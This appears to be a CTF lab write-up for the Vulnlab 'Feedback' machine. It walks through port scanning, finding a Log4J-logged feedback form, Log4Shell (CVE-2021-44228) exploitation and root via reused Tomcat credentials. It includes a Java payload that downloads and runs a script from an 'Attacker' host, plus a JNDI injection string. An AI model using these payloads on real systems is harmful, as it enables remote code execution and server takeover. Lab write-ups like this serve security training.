---
title: Vulnlabs - Feedback
date: 2023-08-10 
categories: [WriteUps]
tags: [writeups] [vulnlabs]   # TAG names should always be lowercase
---
# Vulnlab: Feedback

`Difficulty:` Easy

## Summary:

- Apache Tomcat
- /feedback Directory where "feedback" is logged using Java
- Log4Shell (CVE-2021-44228)
- Password Reuse

### Initial Scan
Initial Nmap scan shows an Apache Tomcat running over HTTP on port 8080.
```shell
➜  ~ nmap -sC -sV 10.10.120.186
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 20:16 EDT
Nmap scan report for 10.10.120.186
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 93:54:07:04:92:d4:1f:fd:54:21:5e:b2:db:ca:7c:ad (RSA)
|   256 f6:ec:e3:d7:97:e6:34:38:62:fe:58:2a:b0:98:21:99 (ECDSA)
|_  256 ca:5a:8b:bc:12:4f:8e:9f:13:30:ff:c1:40:fe:a0:d7 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.56
|_http-title: Apache Tomcat/9.0.56
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Visiting the page reveals it is a default page with nothing inherently suspicious. 

### Directory Fuzzing

A quick Dirb scan reveals the /feedback directory.
```shell
➜  ~ dirb http://10.10.117.96:8080

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Aug  9 21:03:03 2023
URL_BASE: http://10.10.117.96:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.117.96:8080/ ----
+ http://10.10.117.96:8080/docs (CODE:302|SIZE:0)
+ http://10.10.117.96:8080/examples (CODE:302|SIZE:0)
+ http://10.10.117.96:8080/favicon.ico (CODE:200|SIZE:21630)
+ http://10.10.117.96:8080/feedback (CODE:302|SIZE:0)
+ http://10.10.117.96:8080/host-manager (CODE:302|SIZE:0)
+ http://10.10.117.96:8080/manager (CODE:302|SIZE:0)

-----------------
END_TIME: Wed Aug  9 21:15:25 2023
DOWNLOADED: 4612 - FOUND: 6
```

This page allows us to submit feedback. When successful the page tell us that our feedback has been 'logged'. Even without the context clues this can be verified by viewing source.

```html
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF 8">
        ...
    </head>
    <body>
        ...
        <!-- Builb with Java, Struts2 & Log4J -->
    </body>
</html>
```

### Log4Shell
You can either create your own java payload or work your way around the GitHub PoC.

https://vulndev.io/2021/12/11/lab-exploiting-log4shell-cve-2021-44228/
```java
public class RCE {
    static {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("wget http://Attacker/x -O /tmp/x");
            p.waitFor();
            r = Runtime.getRuntime();
            p = r.exec("/bin/bash /tmp/x");
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public RCE(){
        System.out.println("Is this RCE?");
    }
}
```

https://github.com/kozmer/log4j-shell-poc
```shell
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

Pretty much, we are able to use JNDI (Java Naming and Directory Interface) as a means to interract when an attacker LDAP server. We host our payload and when the feedback request gets parsed it will download our payload and run it (giving us a shell).

### Root
Simple Password reuse to wrap it all up.
```shell 
tomcat@ip-10-10-10-7:~/conf$ ls
ls
catalina.policy      jaspic-providers.xml  server.xml	     web.xml
catalina.properties  jaspic-providers.xsd  tomcat-users.xml
context.xml	     logging.properties    tomcat-users.xsd
tomcat@ip-10-10-10-7:~/conf$ cat tomcat-users.xml
cat tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <user username="admin" password="[*****]" roles="manager-gui"/>
  <user username="robot" password="[*****]" roles="manager-script"/>

</tomcat-users>
tomcat@ip-10-10-10-7:~/conf$ su root
su root
Password: [*****]
root@ip-10-10-10-7:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-10-7:~# ls
ls
root.txt  snap
  ```


